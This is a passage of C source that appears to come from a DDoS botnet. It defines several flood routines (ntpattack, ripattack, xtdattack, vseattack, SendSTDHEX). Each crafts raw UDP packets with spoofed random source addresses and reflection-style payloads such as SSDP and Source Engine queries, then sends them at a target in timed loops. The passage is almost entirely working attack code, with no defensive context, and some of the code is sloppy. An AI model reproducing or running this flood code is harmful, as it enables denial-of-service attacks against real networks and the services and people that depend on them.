        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makemempacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + mem_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + mem_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + mem_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makentppacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *ntp_payload;
    int ntp_payload_len;
    ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a", &ntp_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + ntp_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void ntpattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *ntp_payload;
    int ntp_payload_len;
    ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a", &ntp_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makentppacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + ntp_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + ntp_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + ntp_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makerippacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *rip_payload;
    int rip_payload_len;
    rip_payload = "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", &rip_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + rip_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void ripattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *rip_payload;
    int rip_payload_len;
    rip_payload = "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", &rip_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makerippacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + rip_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + rip_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + rip_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makextdpacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *xtd_payload;
    int xtd_payload_len;
    xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",&xtd_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + xtd_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void xtdattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *xtd_payload;
    int xtd_payload_len;
    xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",&xtd_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            rand_init();
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makextdpacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + xtd_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + xtd_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + xtd_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void SendSTDHEX(unsigned char *ip, int port, int secs)
    {
    int std_packet1;
    int ehhehehe;
    srand(time(NULL));
    ehhehehe = rand() % 60;
    if(ehhehehe < 20) {
     std_packet1 = 1093;
    }
        else if(20 < ehhehehe < 40) {
     std_packet1 = 1193;
    }
        else if(40 < ehhehehe < 60) {
     std_packet1 = 1293;
    }
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
        "/73x/6ax/x4a/x4b/x4d/x44/x20/x44/x57/x29/x5f/x20/x44/x57/x49/x4f/x57/x20/x57/x4f/x4b/x3c/x20/x57/x44/x4b/x20/x44/x29/x5f/x41/",
        "/20x/x58/x4b/x49/x57/x44/x49/x4a/x22/x20/x22/x64/x39/x63/x39/x29/x4d/x20/x29/x57/x5f/x22/x21/x5f/x2b/x20/x51/x53/x4d/x45/x4d/x44/x4d/x20/x29/x28/x28/x22/x29/x45/x4f/x4b/x58/x50/x7b/x20/x5f/x57/x44/x44/x57/x44/",
        "/43x/x4f/x44/x57/x20/x49/x20/x22/x5f/x29/x20/x58/x43/x4b/x4d/x20/x53/x4c/x52/x4f/x4d/x20/x43/x50/x4c/x3a/x50/x51/x20/x71/x5b/x7a/x71/x3b/x38/x38/x20/x43/x57/x29/x57/x22/x29/x64/x32/x20/x4b/x58/x4b/x4b/x4c/x22/x44/x20/x2d/x44/x5f/",
        };
        if (a >= 50)
        {
            hexstring = rhexstring[rand() % (sizeof(rhexstring) / sizeof(char *))];
            send(std_hex, hexstring, std_packet1, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
